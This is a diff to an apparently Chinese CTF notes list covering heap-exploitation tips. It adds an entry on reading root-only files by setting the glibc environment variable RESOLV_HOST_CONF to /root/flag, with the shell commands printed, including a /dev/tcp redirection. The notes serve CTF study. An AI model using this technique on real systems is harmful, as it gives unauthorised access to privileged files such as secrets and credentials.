@@ -1422,3 +1422,8 @@ int 0x80
 132. [house-of-sus](https://www.youtube.com/watch?v=qA6ajf7qZtQ)
 - libc 2.27 house of force
 - 当one_gadget因为不满足条件无法使用时，可考虑借用“跳板”。例如，将malloc_hook改为one_gadget,然后将其他函数改为malloc。这样调用那个函数时会调用malloc进而调用one_gadget，但是栈的情况可能会不同让one_gadget得以使用
+133. linux越权读文件。可以在 https://sourceware.org/git/?p=glibc.git;a=blob;f=sysdeps/generic/unsecvars.h 里找没有被题目ban的环境变量，比如RESOLV_HOST_CONF，可以用下面的步骤读文件：
+```sh
+RESOLV_HOST_CONF=/root/flag bash 2>&1
+cat</dev/tcp/a/1
+```
